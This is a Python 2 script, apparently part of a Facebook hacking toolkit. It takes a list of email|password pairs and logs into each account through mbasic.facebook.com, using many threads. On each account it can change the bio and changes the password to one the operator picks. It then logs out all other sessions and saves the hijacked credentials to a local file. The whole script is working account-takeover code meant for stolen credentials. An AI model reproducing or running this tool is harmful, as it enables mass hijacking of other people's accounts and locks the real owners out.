import os
import bs4,sys
import requests
import interpreter
from data.color import *
from data import language
from multiprocessing.pool import ThreadPool

def sets():
	if (os.path.exists("out")):
		if os.path.exists("out/newpassword.txt"):#
			if os.path.getsize("out/newpassword.txt") !=0:
				open("out/newpassword.txt","a")
			else:
				open("out/newpassword.txt","w")
		else:
			open("out/newpassword.txt","w")
	else:
		os.mkdir("out")
		open("out/newpassword.txt","w")
		
class risetPass:
	def __init__(self):
		sets()
		self.fail=0
		self.num=0
		self.failed=[]
		self.newpass=0	
		self.fix_bio=None
		self.i="https://mbasic.facebook.com/{}"
		print("%s[!]%s Sparator: |"%(R,N))
		self.type()
		
	def type(self):
		try:
			self.a=open(raw_input("%s[?]%s Account list: "%(
				G,N))).read().splitlines()
		except Exception as e:
			print("%s[!]%s %s"%(R,N,e))
			self.type()
		self.new()
		
	def new(self):
		self.np=raw_input("%s[?]%s New Passwords: "%(G,N))
		if self.np =="":
			self.new()
		else:
			if len(self.np)<6:
				print("%s[!]%s passwod must contain at 6 characters."%(R,N))
				self.new()
		self.bio()
		
	def bio(self):
		self.ask_bio=raw_input("%s[?]%s Change Bio? y/n): "%(
			G,N)).lower()
		if self.ask_bio =="":
			self.bio()
		elif self.ask_bio =="y":
			self.fix_bio = True
			self.okbio()
		else:
			self.fix_bio = False
			self.thread()
	
	def okbio(self):
		self.b=raw_input("%s[?]%s Bio Message: "%(G,N))
		if self.b =="":
			self.okbio()
		if len(self.b)<6:
			print("%s[!]%s bio must contain at 6 characters"%(R,N))
			self.okbio()
		self.thread()
		
	def thread(self):
		try:
			self.p=ThreadPool(input("%s[?]%s Thread: "%(G,N)))
		except Exception as f:
			print("%s[!]%s %s"%(R,N,f))
			self.thread()
		self.p.map(self.changes,self.a)
		print("\n[*] finished with output: out/newpassword.txt\n")
		if len(self.failed) !=9:
			for x in self.failed:
				print "[!] failed login: %s"%(x)
		raw_input("\npress enter to menu ...")
		interpreter.ASU()
	def changes(self,akun):
		r=requests.Session()
		s=r.post(self.i.format("login"),
			data={
				"email":akun.split("|")[-0],
				"pass":akun.split("|")[-1]
		}).url
		if "save-device" in s or "m_sess" in s:
			if self.fix_bio is True:
				language.lang(r,self.i.format("language.php"))
				self.bi(r,akun)
			else:
				self.change(r,akun)
		else:
			self.failed.append(akun)
			self.fail+=1
		print("\r[*] Change pass:- %s/%s LoginFail:-%s Failed:%s"%(
			self.newpass,len(self.a),self.fail,self.num)),;sys.stdout.flush()
				
	def bi(self,r,akun):
		data=[]
		bs=bs4.BeautifulSoup(
			r.get(self.i.format("profile/basic/intro/bio")).text,
		features="html.parser")
		for x in bs("input"):
			try:
				if "fb_dtsg" in x["name"]:
					data.append(x["value"])
				if "jazoest" in x["name"]:
					data.append(x["value"])
			except:continue
		if len(data) ==2:
			r.post(
			self.i.format("profile/intro/bio/save"),
				data={
					"fb_dtsg":data[0],
					"jazoest":data[1],
					"bio":self.b,
					"submit":"Simpan"})
			self.change(r,akun)
	
	def change(self,r,akun):
		data=[]
		data2=[]
		s=bs4.BeautifulSoup(
			r.get(self.i.format("settings/security/password")).text,
		features="html.parser")
		for x in s("form"):
			if "/password/change/" in x["action"]:
				data.append(self.i.format(x["action"]))
		for x in s("input"):
			try:
				if "fb_dtsg" in x["name"]:
					data.append(x["value"])
				if "jazoest" in x["name"]:
					data.append(x["value"])
			except:pass
		if len(data) ==3:
			final=r.post(
			data[0],data={
				"fb_dtsg":data[1],
				"jazoest":data[2],
				"password_old":akun.split("|")[-1],
				"password_new":self.np,
				"password_confirm":self.np,
				"save":"Simpan Perubahan"
			})
			if "Kata Sandi Telah Diubah" in final.text:
				d=bs4.BeautifulSoup(
			r.get(self.i.format("settings/security_login/sessions/log_out_all/confirm/")).text,"html.parser")
				for x in d.find_all("a",href=True):
					if "sessions/log_out_all" in x["href"]:
						r.get(self.i.format(x["href"]))
				open("out/newpassword.txt","a").write("%s|%s\n"%(akun.split("|")[-0],self.np))
				self.newpass+=1
			else:
				self.num+=1
		
					
			
		

